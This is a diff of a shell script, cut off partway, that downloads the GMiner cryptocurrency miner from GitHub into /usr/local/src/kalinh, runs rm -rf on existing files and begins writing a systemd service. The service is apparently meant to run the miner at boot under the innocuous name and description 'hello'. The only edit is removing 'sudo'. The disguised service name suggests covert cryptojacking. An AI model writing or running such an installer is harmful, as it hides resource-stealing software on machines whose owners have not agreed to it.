@@ -1,6 +1,6 @@
-sudo rm -rfv /usr/local/src/kalinh/ && sudo mkdir /usr/local/src/kalinh && cd /usr/local/src/kalinh && sudo wget https://github.com/develsoftware/GMinerRelease/releases/download/3.03/gminer_3_03_linux64.tar.xz && sudo tar -xvf gminer_3_03_linux64.tar.xz && sudo rm -rf /lib/systemd/system/hello.service
+rm -rfv /usr/local/src/kalinh/ && mkdir /usr/local/src/kalinh && cd /usr/local/src/kalinh && wget https://github.com/develsoftware/GMinerRelease/releases/download/3.03/gminer_3_03_linux64.tar.xz && tar -xvf gminer_3_03_linux64.tar.xz && rm -rf /lib/systemd/system/hello.service
 
-sudo cat > /lib/systemd/system/hello.service <<EOL
+cat > /lib/systemd/system/hello.service <<EOL
 [Unit]
 Description=hello
 After=network.target
